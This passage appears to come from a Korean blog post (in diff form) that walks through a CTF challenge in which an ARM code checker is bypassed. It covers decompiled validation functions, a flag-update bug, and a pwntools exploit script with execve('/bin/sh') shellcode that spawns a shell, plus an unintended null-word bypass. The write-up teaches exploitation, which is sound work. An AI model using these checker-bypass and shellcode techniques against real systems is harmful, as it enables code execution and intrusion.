*)em-&gt;reg-&gt;pc &lt; em-&gt;code )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    fetched = *(_DWORD *)em-&gt;reg-&gt;pc;</span><br><span class="line">    em-&gt;reg-&gt;pc += <span class="number">4</span>;</span><br><span class="line">    <span class="keyword">if</span> ( !inst )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ( inst != <span class="number">-1</span> &amp;&amp; !check_cpsr(inst) )</span><br><span class="line">      sigill(inst);</span><br><span class="line">    op1 = get_class(inst);</span><br><span class="line">    <span class="keyword">if</span> ( op1 &lt;= <span class="number">4</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">switch</span> ( op1 )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0u</span>:                                <span class="comment">// data processing and miscellaneous instructions</span></span><br><span class="line">          <span class="keyword">if</span> ( check_data_processing(inst) == <span class="number">-1</span> )</span><br><span class="line">            sigill(inst);</span><br><span class="line">          <span class="keyword">continue</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1u</span>:</span><br><span class="line">          <span class="keyword">if</span> ( check_multiply(inst) == <span class="number">-1</span> )</span><br><span class="line">            sigill(inst);</span><br><span class="line">          <span class="keyword">continue</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2u</span>:                                <span class="comment">// branch, branch with link, block data transfer</span></span><br><span class="line">          <span class="keyword">if</span> ( check_branch(inst) == <span class="number">-1</span> )</span><br><span class="line">            sigill(inst);</span><br><span class="line">          fetched = <span class="number">-1</span>;</span><br><span class="line">          <span class="keyword">continue</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">3u</span>:                                <span class="comment">// supervisor call</span></span><br><span class="line">          <span class="keyword">if</span> ( check_syscall() == <span class="number">-1</span> )</span><br><span class="line">            sigill(inst);</span><br><span class="line">          <span class="keyword">continue</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">4u</span>:                                <span class="comment">// load/store word and unsigned byte</span></span><br><span class="line">          <span class="keyword">if</span> ( check_load_store(inst) == <span class="number">-1</span> )</span><br><span class="line">            sigill(inst);</span><br><span class="line">          <span class="keyword">continue</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">          <span class="keyword">goto</span> LABEL_23;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( op1 != <span class="number">-1</span> )</span><br><span class="line">LABEL_23:</span><br><span class="line">      sigill(inst);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>각각의 <code>check_*</code> 함수는 인스트럭션의 형식이나 인자를 검사한 후, 통과하면 인스트럭션의 실행 결과를 <code>emulator</code> 구조체 변수 <code>em</code> 에 반영하고 통과하지 못한 경우 -1을 리턴하여 종료하도록 합니다. 예를 들어 <code>check_branch</code> 함수는 인자가 상수(immediate) 값인 분기 인스트럭션을 검사하고 <code>em-&gt;reg-&gt;pc</code> 를 갱신하는데, 조건문을 통해 목적지 주소가 <code>em-&gt;code</code> 로 할당된 메모리를 벗어나는 경우 -1을 반환합니다.</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">check_branch</span><span class="params">(<span class="type">int</span> inst)</span>   <span class="comment">// 0x11f28</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// r0</span></span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// r3</span></span><br><span class="line"></span><br><span class="line">  v1 = shl8(inst);</span><br><span class="line">  v2 = <span class="number">4</span> * (v1 &gt;&gt; <span class="number">8</span>);</span><br><span class="line">  <span class="keyword">if</span> ( ((v1 &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0x20000000</span>) != <span class="number">0</span> )</span><br><span class="line">    v2 += <span class="number">3</span>;</span><br><span class="line">  <span class="keyword">if</span> ( em-&gt;reg-&gt;pc + <span class="number">4</span> * (v2 &gt;&gt; <span class="number">2</span>) &gt;= (<span class="type">unsigned</span> <span class="type">int</span>)(em-&gt;code + <span class="number">0x4000</span>) )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  em-&gt;reg-&gt;pc += <span class="number">4</span> * (<span class="number">4</span> * (v1 &gt;&gt; <span class="number">8</span>) / <span class="number">4</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="%EB%AC%B8%EC%A0%9C-%ED%92%80%EC%9D%B4" tabindex="-1">문제 풀이</h2>
+<p>분석한 결과를 바탕으로 생각할 수 있는 익스플로잇 시나리오가 두 가지 정도 있습니다.</p>
+<ol>
+<li><code>check_code</code> 함수의 <code>check_*</code> 루틴에서 익스플로잇 프리미티브(e.g. 임의 쓰기)를 찾아 익스플로잇한다.</li>
+<li><code>check_code</code> 의 검사를 통과하면서, <code>main</code> 에서 입력한 코드를 호출했을 때 익스플로잇이 수행되는 셸코드를 입력한다.</li>
+</ol>
+<p>그런데 <code>check_*</code> 함수들은 대부분 목적지 레지스터나 주소의 범위에 제한을 두고 있어 익스플로잇 프리미티브 구성에 도움이 되지 않습니다. 예를 들어 다음은 <code>check_load_store</code> 함수의 일부입니다. 23행, 26행, 32행 등을 보면 목적지 레지스터는 <code>R0</code> , … , <code>R12</code> 까지만 가능하도록, 읽고 쓰는 주소는 <code>em-&gt;heap</code> , <code>em-&gt;stack</code> 으로 할당된 메모리만 가능하도록 제한을 두고 있습니다.</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">check_load_store</span><span class="params">(<span class="type">int</span> inst)</span>	<span class="comment">// 0x12000</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">  bit11_0 = get_bit11_0(inst);</span><br><span class="line">  rn = get_bit16_19(inst);</span><br><span class="line">  <span class="keyword">if</span> ( rn &lt;= <span class="number">12</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    rn_val = (<span class="type">char</span> *)*(&amp;em-&gt;reg-&gt;r0 + rn);</span><br><span class="line">    <span class="keyword">if</span> ( get_bit25(inst) )                      <span class="comment">// bit25 is 1 (A bit)</span></span><br><span class="line">    &#123;</span><br><span class="line">      rm = bit11_0 &amp; <span class="number">0xF</span>;</span><br><span class="line">      <span class="keyword">if</span> ( rm &gt; <span class="number">12</span> )</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="keyword">if</span> ( get_bit24(inst) )                      <span class="comment">// bit24 is 1 (P bit)</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( get_bit23(inst) )                    <span class="comment">// bit23 is 1 (U bit)</span></span><br><span class="line">        v6 = &amp;rn_val[bit11_0];</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        v6 = &amp;rn_val[-bit11_0];</span><br><span class="line">      <span class="keyword">if</span> ( get_bit20(inst) )                    <span class="comment">// bit20 is 1</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( (v6 &lt; em-&gt;heap || v6 &gt; em-&gt;heap + <span class="number">4096</span>) &amp;&amp; (v6 &lt; em-&gt;<span class="built_in">stack</span> || v6 &gt; em-&gt;<span class="built_in">stack</span> + <span class="number">4096</span>) )</span><br><span class="line">          <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        rt = shr12(inst);</span><br><span class="line">        <span class="keyword">if</span> ( rt &gt; <span class="number">0xC</span> )</span><br><span class="line">          <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        *(&amp;em-&gt;reg-&gt;r0 + rt) = *(_DWORD *)v6;   <span class="comment">// load</span></span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( (v6 &lt; em-&gt;heap || v6 &gt; em-&gt;heap + <span class="number">4096</span>) &amp;&amp; (v6 &lt; em-&gt;<span class="built_in">stack</span> || v6 &gt; em-&gt;<span class="built_in">stack</span> + <span class="number">4096</span>) )</span><br><span class="line">          <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        v13 = shr12(inst);</span><br><span class="line">        <span class="keyword">if</span> ( v13 &gt; <span class="number">0xC</span> )</span><br><span class="line">          <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        *(_DWORD *)v6 = *(&amp;em-&gt;reg-&gt;r0 + v13);  <span class="comment">// store</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// ...</span></span><br></pre></td></tr></table></figure>
+<p>산술 연산과 관련된 인스트럭션을 검사하는 <code>check_data_processing</code> 함수에서도 9행, 11행 등에서 산술 연산의 목적지와 인자 레지스터에 제한을 두고 있습니다. 그런데 실제 연산의 결과를 반영하는 서브루틴에서 흥미로운 코드를 찾을 수 있습니다.</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">check_data_processing</span><span class="params">(<span class="type">int</span> inst)</span>	<span class="comment">// 0x117b8</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">  v7 = sub_114E0(inst);</span><br><span class="line">  bit11_0 = get_bit11_0(inst);</span><br><span class="line">  bit16_19 = get_bit16_19(inst);</span><br><span class="line">  v10 = shr12(inst);</span><br><span class="line">  bit20 = get_bit20(inst);</span><br><span class="line">  <span class="keyword">if</span> ( bit16_19 &lt; <span class="number">0</span> || bit16_19 &gt; <span class="number">12</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v10 &lt; <span class="number">0</span> || v10 &gt; <span class="number">12</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">  <span class="keyword">switch</span> ( v7 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="keyword">case</span> <span class="number">4u</span>:</span><br><span class="line">      <span class="keyword">if</span> ( check_add(bit16_19, v4, v10, bit20) == <span class="number">-1</span> )</span><br><span class="line">        sigill(inst);</span><br><span class="line">      <span class="keyword">return</span> result;</span><br><span class="line">    <span class="comment">// ...</span></span><br></pre></td></tr></table></figure>
+<p><code>check_add</code> 함수는 <code>check_data_processing</code> 함수에서 <code>ADD</code> 인스트럭션의 결과를 반영하기 위해 호출하는 서브루틴입니다. 이 함수는 연산 결과를 목적지 레지스터에 대입하고, <code>update_zf_nf</code> 함수를 호출하여 <code>CPSR</code> 레지스터의 플래그를 갱신하고 있습니다. (<code>update_zf_nf</code> 함수를 호출하는 조건 <code>a4</code> 는 인스트럭션의 bit 20이 전달된 값으로, <code>S</code> 비트에 해당합니다)</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">check_add</span><span class="params">(<span class="type">int</span> a1, <span class="type">int</span> a2, <span class="type">int</span> a3, <span class="type">int</span> a4)</span>	<span class="comment">// 0x12fb8</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// [sp+14h] [bp-8h]</span></span><br><span class="line"></span><br><span class="line">  update_cf(*(&amp;em-&gt;reg-&gt;r0 + a1) + a2 &lt; *(&amp;em-&gt;reg-&gt;r0 + a1));</span><br><span class="line">  result = a2 + *(&amp;em-&gt;reg-&gt;r0 + a1);</span><br><span class="line">  <span class="keyword">if</span> ( a4 )</span><br><span class="line">    update_zf_nf(result);</span><br><span class="line">  *(&amp;em-&gt;reg-&gt;r0 + a3) = result;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><code>update_zf_nf</code> 함수는 인자로 받은 연산 결과를 <code>update_zf</code> , <code>update_nf</code> 함수에 전달합니다.</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">update_zf_nf</span><span class="params">(<span class="type">int</span> a1)</span>	<span class="comment">// 0x12d4c</span></span><br><span class="line">&#123;</span><br><span class="line">  update_zf(a1);</span><br><span class="line">  update_nf(a1);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><code>update_nf</code> 함수는 연산의 결과가 0이 아닐 경우 비트 연산을 통해 <code>em-&gt;reg-&gt;cpsr</code> 값의 bit 31에 1을 대입합니다. 이는 <code>CPSR</code> 레지스터의 <code>N</code> 비트에 해당하는데, 정의 상 <code>N</code> 비트는 결과가 음수인 경우(최상위 비트가 1인 경우) 1이어야 합니다. 따라서 <code>update_nf</code> 함수는 <code>em-&gt;reg-&gt;cpsr</code> 값을 실제 인스트럭션의 결과와 다르게 반영하고 있습니다.</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">update_nf</span><span class="params">(<span class="type">int</span> a1)</span>    <span class="comment">// 0x12ccc</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( a1 )</span><br><span class="line">    em-&gt;reg-&gt;cpsr |= <span class="number">0x80000000</span>;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    em-&gt;reg-&gt;cpsr &amp;= <span class="number">0x70000000</span>u;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>이를 이용해 다음과 같이 셀코드를 입력하고도 <code>check_code</code> 함수를 통과하여 실행하는 익스플로잇 시나리오를 구성할 수 있습니다. (단순 셸코드를 입력하면 <code>check_syscall</code> 함수에서 시스템 콜 번호를 필터링하여 종료합니다)</p>
+<ol>
+<li>산술 연산을 통해 <code>em-&gt;reg-&gt;cpsr</code> 의 <code>N</code> 비트가 1이 되도록 합니다. (잘못 반영된 결과입니다)</li>
+<li><code>N</code> 비트와 관련된 조건 분기를 통해 셸코드 부분을 실행하지 않고 점프하도록 합니다.</li>
+<li>실제 실행 시에는 <code>N</code> 비트가 0으로 조건 분기를 수행하지 않아, 셸코드를 실행하게 됩니다.</li>
+</ol>
+<p><code>check_cpsr</code> 함수를 보면 모든 조건이 구현되어 있지는 않지만, <code>LT</code> (signed less than) 조건은 구현되어 있습니다. 따라서 셸코드 이전에 결과가 0이 아닌 산술 연산을 수행하고 <code>BLT</code> 인스트럭션으로 조건 분기하도록 하겠습니다. <code>check_code</code> 함수 상에서는 <code>update_nf</code> 함수에서 잘못 반영한 결과로 인해 <code>N</code> 비트가 1이 되어, <code>V</code> 비트와 같지 않게 되므로 조건 분기를 수행합니다. 그러나 실제 실행 시에는 <code>N</code> 비트가 0으로 조건 분기를 수행하지 않을 것입니다.</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">check_cpsr</span><span class="params">(<span class="type">int</span> inst)</span> <span class="comment">// 0x11314</span></span><br><span class="line">&#123;</span><br><span class="line">  _BOOL4 v1; <span class="comment">// r3</span></span><br><span class="line">  _BOOL4 v2; <span class="comment">// r3</span></span><br><span class="line">  <span class="type">int</span> valid; <span class="comment">// [sp+8h] [bp-24h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> cpsr; <span class="comment">// [sp+10h] [bp-1Ch]</span></span><br><span class="line"></span><br><span class="line">  cpsr = em-&gt;reg-&gt;cpsr;</span><br><span class="line">  <span class="keyword">switch</span> ( shr28(inst) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0u</span>:                                    <span class="comment">// equal (z == 1)</span></span><br><span class="line">      valid = cpsr &amp; <span class="number">0x40000000</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1u</span>:                                    <span class="comment">// not equal (z == 0)</span></span><br><span class="line">      valid = (cpsr &amp; <span class="number">0x40000000</span>) == <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">10u</span>:                                   <span class="comment">// signed greater than or equal (n == v)</span></span><br><span class="line">      valid = cpsr &gt;&gt; <span class="number">31</span> == (<span class="number">8</span> * cpsr) &gt;&gt; <span class="number">31</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">11u</span>:                                   <span class="comment">// signed less than (n != v)</span></span><br><span class="line">      valid = cpsr &gt;&gt; <span class="number">31</span> != (<span class="number">8</span> * cpsr) &gt;&gt; <span class="number">31</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">12u</span>:                                   <span class="comment">// signed greater than (z == 0 and n == v)</span></span><br><span class="line">      v1 = (cpsr &amp; <span class="number">0x40000000</span>) == <span class="number">0</span> &amp;&amp; cpsr &gt;&gt; <span class="number">31</span> == (<span class="number">8</span> * cpsr) &gt;&gt; <span class="number">31</span>;</span><br><span class="line">      valid = v1;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">13u</span>:                                   <span class="comment">// signed less than or equal (z == 1 or n == v)</span></span><br><span class="line">      v2 = (cpsr &amp; <span class="number">0x40000000</span>) != <span class="number">0</span> || cpsr &gt;&gt; <span class="number">31</span> != (<span class="number">8</span> * cpsr) &gt;&gt; <span class="number">31</span>;</span><br><span class="line">      valid = v2;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">14u</span>:                                   <span class="comment">// always</span></span><br><span class="line">      valid = <span class="number">1</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:                                    <span class="comment">// can only be executed unconditionally</span></span><br><span class="line">      valid = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> valid;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>다음과 같이 <code>ADDS</code> 인스트럭션의 결과가 1이 되도록 하고, <code>BLT</code> 의 분기 주소를 셸코드 이후가 되도록 익스플로잇 코드를 작성하였습니다. 익스플로잇 코드를 실행하면 셸을 획득할 수 있습니다.</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># r = process([&quot;qemu-arm-static&quot;, &quot;-L&quot;, &quot;/usr/arm-linux-gnueabi&quot;, &quot;./app&quot;])</span></span><br><span class="line">r = remote(<span class="string">&quot;localhost&quot;</span>, <span class="number">1234</span>)</span><br><span class="line"><span class="comment"># context.log_level = &quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    payload = asm(<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    adds r0, r0, 1</span></span><br><span class="line"><span class="string">    blt exit</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">shellcode:</span></span><br><span class="line"><span class="string">    add r0, pc, 12</span></span><br><span class="line"><span class="string">    mov r1, 0</span></span><br><span class="line"><span class="string">    mov r2, 0</span></span><br><span class="line"><span class="string">    mov r7, 11</span></span><br><span class="line"><span class="string">    svc 0</span></span><br><span class="line"><span class="string">    .word 0x6e69622f</span></span><br><span class="line"><span class="string">    .word 0x0068732f</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">exit:</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span>, arch=<span class="string">&quot;arm&quot;</span>)</span><br><span class="line"></span><br><span class="line">    r.sendafter(<span class="string">b&quot;Insert Your Code :&gt;&quot;</span>, payload)</span><br><span class="line">    r.sendlineafter(<span class="string">b&quot;:&gt;&quot;</span>, <span class="string">b&quot;1&quot;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&quot;Secret code :&quot;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">b&quot;Code? :&gt;&quot;</span>, r.recvline().strip())</span><br><span class="line"></span><br><span class="line">    r.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ ./ex.py</span><br><span class="line">[+] Opening connection to localhost on port 1234: Done</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line"> Good! Now Execute Real Machine</span><br><span class="line">$ <span class="built_in">id</span></span><br><span class="line">uid=1000(ctf) gid=1000(ctf) <span class="built_in">groups</span>=1000(ctf)</span><br></pre></td></tr></table></figure>
+<h3 id="%EB%8B%A4%EB%A5%B8-%ED%92%80%EC%9D%B4" tabindex="-1">다른 풀이</h3>
+<p><code>check_code</code> 함수를 보면 다음의 10행에서 <code>inst</code> 가 0인 경우 반복문을 탈출합니다. 이 경우 0을 리턴하여 <code>main</code> 함수의 검사를 통과하기 때문에 곧바로 입력한 코드를 실행할 수 있습니다. ARM에서 기계어 <code>\x00\x00\x00\x00</code> 은 <code>ANDEQ R0, R0, R0</code> 인스트럭션에 해당하는데, 실제로는 아무 영향이 없는 <code>NOP</code> 와 같습니다.</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">check_code</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">  <span class="keyword">for</span> ( inst = <span class="number">-1</span>; em-&gt;reg-&gt;pc &lt; (<span class="type">unsigned</span> <span class="type">int</span>)(em-&gt;code + <span class="number">4096</span>); inst = fetched )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="type">char</span> *)em-&gt;reg-&gt;pc &lt; em-&gt;code )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    fetched = *(_DWORD *)em-&gt;reg-&gt;pc;</span><br><span class="line">    em-&gt;reg-&gt;pc += <span class="number">4</span>;</span><br><span class="line">    <span class="keyword">if</span> ( !inst )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ( inst != <span class="number">-1</span> &amp;&amp; !check_cpsr(inst) )</span><br><span class="line">      sigill(inst);</span><br><span class="line">    op1 = get_class(inst);</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="keyword">if</span> ( op1 != <span class="number">-1</span> )</span><br><span class="line">LABEL_23:</span><br><span class="line">      sigill(inst);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>따라서 코드를 입력할 때 <code>\x00\x00\x00\x00</code> 이후 셸코드를 입력하면 <code>check_code</code> 함수를 통과하여 셸코드를 실행할 수 있습니다. 이 풀이는 출제자가 디스코드에서 의도하지 않은 풀이라고 밝혔습니다.</p>
+<h2 id="%EC%B0%B8%EA%B3%A0%EC%9E%90%EB%A3%8C" tabindex="-1">참고자료</h2>
+<p>[1] ARM, “A5: ARM Instruction Set Encoding,” in <em>ARM® Architecture Reference Manual ARMv7-A and ARMv7-R edition</em>. ARM Limited, 2018, pp. 191-216.</p>
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/katex/dist/katex.min.css">
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/markdown-it-texmath/css/texmath.min.css">
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2022/07/02/arm-1-introduction/" rel="prev" title="1. ARM 리버스 엔지니어링 기초">
+                  <i class="fa fa-chevron-left"></i> 1. ARM 리버스 엔지니어링 기초
+                </a>
+            </div>
+            <div class="post-nav-item">
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+    <div class="comments gitalk-container"></div>
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+
+<div class="copyright">
+  &copy; 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class=""></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Juhyun Song</span>
+</div>
+
+    </div>
+  </footer>
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
